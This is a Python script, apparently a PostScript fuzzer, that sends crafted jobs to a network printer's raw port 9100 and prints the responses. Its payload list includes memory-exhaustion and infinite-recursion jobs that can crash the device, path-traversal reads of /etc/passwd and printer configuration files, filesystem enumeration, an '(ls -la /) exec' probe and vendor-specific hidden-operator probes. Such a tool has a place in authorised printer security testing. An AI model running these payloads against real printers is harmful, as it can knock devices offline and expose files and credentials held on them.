#!/usr/bin/env python3
"""PostScript operator fuzzer — sends crafted PS jobs to port 9100"""
import socket
import time
import random

TARGET = "<printer-ip>"
PORT = 9100

PS_HEADER = b"""%!PS-Adobe-3.0
%%Title: FuzzJob
%%EndComments
"""

PS_FOOTER = b"""
showpage
%%EOF
"""

def send_ps(body: bytes):
    job = PS_HEADER + body + PS_FOOTER
    try:
        s = socket.socket()
        s.settimeout(8)
        s.connect((TARGET, PORT))
        s.send(job)
        resp = b""
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                resp += c
        except socket.timeout:
            pass
        s.close()
        return resp
    except Exception as e:
        return str(e).encode()

CASES = [
    # Memory exhaustion
    b"65535 65535 string pop",
    b"1 { 65535 65535 string pop } loop",
    b"1 { 65535 array pop } loop",
    b"/d 65535 dict def",

    # Deep recursion
    b"/r { r } def r",
    b"/f { 1 f } def 1 f",

    # File system operators (may be locked but worth probing)
    b"(../../../etc/passwd) (r) file",
    b"(0:\\config.cfg) (r) file",
    b"(*) {=} 255 string filenameforall",
    b"currentdevice getdeviceprops",
    b"% try to get accessible volumes\n(*) { print } 255 string filenameforall",

    # exec / run operators
    b"(ls -la /) exec",
    b"{ } exec",
    b"0 exec",
    b"null exec",

    # Type confusion
    b"0 0 div",         # division by zero
    b"-1 sqrt",         # domain error
    b"[] length",       # empty array
    b"<< >> begin end", # empty dict on dict stack

    # Integer boundary values
    b"2147483647 1 add",
    b"-2147483648 1 sub",
    b"2147483647 2147483647 mul",

    # String operations at limits
    b"65535 string dup 0 (AAAA) putinterval",
    b"65535 string 0 65535 getinterval",
    
    # Known HP-specific operator probe
    b"system227",
    b"(system227) cvn cvx exec",
    b"/system227 { } bind def system227",

    # Format string style
    b"(%s%s%s%s) print",
    b"(\\x00\\x00\\x00\\x00) cvn",

    # Stack overflow
    b"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 " * 500,

    # Binary encoding probe (like what the target generates)
    b"\x80\x01" + b"\x00" * 16,  # binary object sequence header

    # Nested procedure depth
    b"{ " * 500 + b"1" + b" }" * 500 + b" exec",
]

for i, ps in enumerate(CASES):
    resp = send_ps(ps)
    print(f"\n[{i+1:03d}] PAYLOAD: {ps[:80]!r}")
    if resp:
        print(f"       RESP ({len(resp)}b): {resp[:200]!r}")
    time.sleep(1.5)
